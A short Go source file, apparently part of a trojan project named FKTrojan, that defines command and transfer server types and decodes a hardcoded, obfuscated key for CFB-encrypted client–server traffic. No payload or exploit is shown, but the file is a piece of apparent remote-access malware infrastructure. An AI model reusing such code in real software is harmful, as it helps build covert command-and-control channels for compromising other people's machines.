package connect

import (
	"FKTrojan/common"
	"io"
)

type ServerType int

const (
	COMMAND_SERVER ServerType = iota
	TRANSFER_SERVER
)
const (
	LISTEN_IP   = "0.0.0.0"
	CFB_KEY_LEN = 32
)

var (
	// 不要随意更改此值
	// 否则可能导致 客户端和服务器因为key不一致 无法通信
	// key的生成参考TestGenerateCFBK
	cFB_KEY1 = "Tn9ieXmnJXOnbHqwc3qwbDGJdHVi[IOnZoWn[TG2bXZibX[je3[weDGjc3VieXmnJX[jd4WqMx>>"
)

type Handler func(r io.Reader, w io.Writer) error

func GetCFBK() string {
	return common.Base64Decode(common.Deobfuscate(cFB_KEY1))[:CFB_KEY_LEN]
}
